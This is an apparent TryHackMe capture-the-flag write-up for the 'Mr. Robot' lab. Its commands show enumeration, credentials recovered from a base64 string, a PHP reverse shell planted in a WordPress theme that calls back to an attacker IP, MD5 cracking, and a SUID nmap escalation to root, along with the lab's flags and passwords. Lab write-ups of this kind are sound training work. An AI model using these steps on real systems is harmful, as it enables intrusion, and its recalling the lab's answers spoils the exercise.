# Mr. Robot CTF — TryHackMe Writeup

**Platform:** TryHackMe  
**Room:** Mr. Robot CTF  
**Difficulty:** Medium  
**Author:** Anthony Lee Carrera Molina  
**Date:** October 2026  
**Status:** Completed — 3/3 flags

---

## Summary

In this room I compromised a Linux machine inspired by the Mr. Robot TV show. I started with web enumeration using nmap and gobuster, found credentials hidden in a base64-encoded file served by the web server, and used them to access the WordPress admin panel. From there I injected a PHP reverse shell through the theme editor to get a foothold on the machine. I then found an MD5 hash stored in a world-readable file, cracked it with John the Ripper to move laterally to another user, and finally escalated to root by abusing a SUID bit set on a legacy version of nmap.

**Attack chain:** Recon → Web enumeration → Credential discovery → WordPress login → PHP reverse shell → MD5 hash cracking → Lateral movement → SUID exploitation → Root

---

## Flags

| Flag | Hash |
|------|------|
| key-1-of-3.txt | `073403c8a58a1f80d943455fb30724b9` |
| key-2-of-3.txt | `822c73956184f694993bede3eb39f959` |
| key-3-of-3.txt | `04787ddef27c3dee1ee161b21670b4e4` |

---

## Reconnaissance

### Nmap — Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

**Relevant open ports:**
- 80/tcp — HTTP (Apache)
- 443/tcp — HTTPS
- 22/tcp — SSH (closed)

SSH is closed, so the entry point is the web application.

---

## Web Enumeration

### robots.txt

Checking `robots.txt` is standard procedure on any web engagement — sites use it to tell search engines what not to index, but it often leaks internal paths.

```
http://<TARGET_IP>/robots.txt
```

**Contents:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two files exposed immediately:

```bash
# Retrieve first flag
curl http://<TARGET_IP>/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9

# Download the wordlist
wget http://<TARGET_IP>/fsocity.dic
```

**Flag 1 captured:** `073403c8a58a1f80d943455fb30724b9`

`fsocity.dic` is a large wordlist (858,160 lines) with many duplicates. It was downloaded and deduplicated as a potential brute-force wordlist for the WordPress login:

```bash
sort -u fsocity.dic > fsocity-clean.dic
wc -l fsocity-clean.dic
# 11451 fsocity-clean.dic
```

> **Note:** The brute-force approach was ultimately unnecessary. Direct credentials were recovered from `license.txt` (see next section), making `fsocity.dic` redundant in this attack path. Preparing it first is still good methodology — you don't know what you'll find until you look.

### Directory Brute Force — Gobuster

```bash
gobuster dir \
  -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -t 50 \
  2>/dev/null
```

**Notable findings:**
- `/wp-login.php` — WordPress login panel
- `/wp-admin` — WordPress admin panel
- `/license.txt` — custom file (not a standard WordPress file)
- `/readme` — WordPress readme

### Credential Discovery — license.txt

`/license.txt` is not a standard WordPress file — worth inspecting manually.

```
http://<TARGET_IP>/license.txt
```

**Contents:**
```
do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mg==
```

The string at the bottom is base64-encoded. Decode it:

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mg==" > base64.txt
base64 -d base64.txt
# elliot:ER28-0652
```

**Credentials recovered:**
- Username: `elliot`
- Password: `ER28-0652`

---

## Exploitation — WordPress RCE via PHP Reverse Shell

### WordPress Login

Navigate to `/wp-login.php` and authenticate with `elliot:ER28-0652`. Login succeeds — `elliot` is an administrator.

### Injecting a PHP Reverse Shell

WordPress administrators can edit theme template files directly from the dashboard. The 404 template is ideal because it can be triggered on demand by requesting a non-existent page.

**Path:** Appearance → Editor → 404.php

Replace the contents with a PHP reverse shell. Using the standard Pentest Monkey PHP reverse shell, update the IP and port:

```php
$ip = '<ATTACKER_IP>';
$port = 4444;
```

Save the file. Start the Netcat listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell by requesting a non-existent page:

```
http://<TARGET_IP>/404-page-that-doesnt-exist
```

**Shell received as `daemon`.**

Upgrade to a stable TTY shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Lateral Movement — User: robot

### Discovering Credentials

Navigating to `/home/robot`:

```bash
cd /home/robot
ls -la
```

```
-r-------- 1 robot robot  33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot  39 Nov 13  2015 password.raw-md5
```

`key-2-of-3.txt` is only readable by user `robot`. However, `password.raw-md5` is world-readable:

```bash
cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Cracking the MD5 Hash

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt
```

**Result:** `abcdefghijklmnopqrstuvwxyz`

### Switching to robot

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
# 822c73956184f694993bede3eb39f959
```

**Flag 2 captured:** `822c73956184f694993bede3eb39f959`

---

## Privilege Escalation — SUID nmap

### Enumerating SUID Binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

**Interesting finding:**
```
-rwsr-xr-x 1 root root 17272 Jun  2  2025 /usr/local/bin/nmap
```

An older version of nmap is installed with the SUID bit set, meaning it executes as root regardless of who runs it. Legacy nmap versions include an `--interactive` mode that allows executing arbitrary shell commands — a well-known escalation vector documented on GTFOBins.

### Exploiting nmap --interactive

```bash
nmap --interactive
```

```
nmap> !sh
# whoami
root
```

### Capturing the Final Flag

```bash
cat /root/key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

**Flag 3 captured:** `04787ddef27c3dee1ee161b21670b4e4`

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Reconnaissance | Active Scanning | T1595 | Nmap port scan |
| Discovery | File and Directory Discovery | T1083 | Gobuster directory brute force |
| Credential Access | Credentials in Files | T1552.001 | Base64-encoded credentials in license.txt |
| Initial Access | Exploit Public-Facing Application | T1190 | WordPress RCE via theme editor |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | PHP reverse shell → bash |
| Credential Access | Brute Force: Password Cracking | T1110.002 | John the Ripper MD5 hash cracking |
| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid | T1548.001 | SUID nmap --interactive shell escape |
| Execution | Command and Scripting Interpreter | T1059 | Shell spawned via nmap !sh |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| gobuster | Web directory brute force |
| curl / wget | File retrieval from web server |
| base64 | Credential decoding |
| john | MD5 hash cracking |
| nc (Netcat) | Reverse shell listener |
| nmap --interactive | SUID privilege escalation |

---

## Key Takeaways

- **robots.txt** should always be checked manually — it exposed the wordlist and the first flag directly.
- **Non-standard files** like `license.txt` often contain intentional or accidental information leakage. Gobuster revealed it; manual review extracted the credentials.
- **WordPress administrator access = RCE** in most configurations. The theme editor is a built-in remote code execution vector.
- **World-readable credential files** are a common misconfiguration. `password.raw-md5` was readable by any user on the system.
- **SUID on legacy tools** like old nmap versions is a well-known escalation path. Always enumerate SUID binaries as part of local privilege escalation methodology.

---

*Writeup by Anthony Lee Carrera Molina | github.com/anthony-offensive/offensive-security-portfolio*
